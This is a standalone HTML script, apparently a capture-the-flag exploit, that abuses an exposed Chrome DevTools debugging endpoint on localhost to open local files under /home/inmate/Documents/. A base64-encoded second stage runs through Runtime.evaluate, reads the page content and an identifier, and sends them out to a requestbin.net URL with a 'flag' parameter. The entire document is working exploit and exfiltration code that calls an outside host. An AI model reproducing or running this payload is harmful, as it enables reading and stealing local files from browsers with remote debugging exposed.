<script>

    function sleep (time) {
      return new Promise((resolve) => setTimeout(resolve, time));
    }
    fetch('http://127.0.0.1:5000/json/new?file:///home/inmate/Documents/')
    .then(response => response.json())
    .then(data => { 
        asd = data.webSocketDebuggerUrl; 
        console.log(asd); 
        window.ws = new WebSocket(asd);
        ws.onerror = (e => {window.open("https://requestbin.net/r/a6oqdw2z?error")})
          ws.onopen = (e => {window.open("https://requestbin.net/r/a6oqdw2z?loaded")})     
        sleep(500).then(() => {
            console.log("here")
            ws.send(JSON.stringify({
                id: 1,
                method: 'Runtime.evaluate',
                params: { expression: 'eval(atob("aWQgPSB3aW5kb3cuZG9jdW1lbnQuaGVhZC50ZXh0Q29udGVudC5zcGxpdCgnYWRkUm93KCInKVsxXS5zcGxpdCgnIicpWzBdDQpuYXZpZ2F0b3Iuc2VuZEJlYWNvbigiaHR0cHM6Ly9yZXF1ZXN0YmluLm5ldC9yL2E2b3FkdzJ6P3R4dCIsIGlkKQ0KZnVuY3Rpb24gc2xlZXAgKHRpbWUpIHsNCiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgdGltZSkpOw0KICB9DQpmZXRjaCgnaHR0cDovLzEyNy4wLjAuMTo1MDAwL2pzb24vbmV3P2ZpbGU6Ly8vaG9tZS9pbm1hdGUvRG9jdW1lbnRzLycraWQpDQoudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS5qc29uKCkpDQoudGhlbihkYXRhID0+IHsgDQogICAgYXNkID0gZGF0YS53ZWJTb2NrZXREZWJ1Z2dlclVybDsgDQogICAgd2luZG93LndzID0gbmV3IFdlYlNvY2tldChhc2QpOw0KICAgIHdzLm9uZXJyb3IgPSAoZSA9PiB7d2luZG93Lm9wZW4oImh0dHBzOi8vcmVxdWVzdGJpbi5uZXQvci9hNm9xZHcyej9lcnJvciIpfSkNCiAgICBzbGVlcCg1MDApLnRoZW4oKCkgPT4gew0KICAgICAgICBjb25zb2xlLmxvZygiaGVyZSIpDQogICAgICAgIHdzLnNlbmQoSlNPTi5zdHJpbmdpZnkoew0KICAgICAgICAgICAgaWQ6IDEsDQogICAgICAgICAgICBtZXRob2Q6ICdSdW50aW1lLmV2YWx1YXRlJywNCiAgICAgICAgICAgIHBhcmFtczogeyBleHByZXNzaW9uOiAnbmF2aWdhdG9yLnNlbmRCZWFjb24oImh0dHBzOi8vcmVxdWVzdGJpbi5uZXQvci9hNm9xZHcyej9mbGFnPSIsIHdpbmRvdy5kb2N1bWVudC5ib2R5LnRleHRDb250ZW50KScgfQ0KICAgICAgICB9KSkNCiAgICB9KQ0KIH0p"))' }
            }))
        })
     })
    
    
    </script>
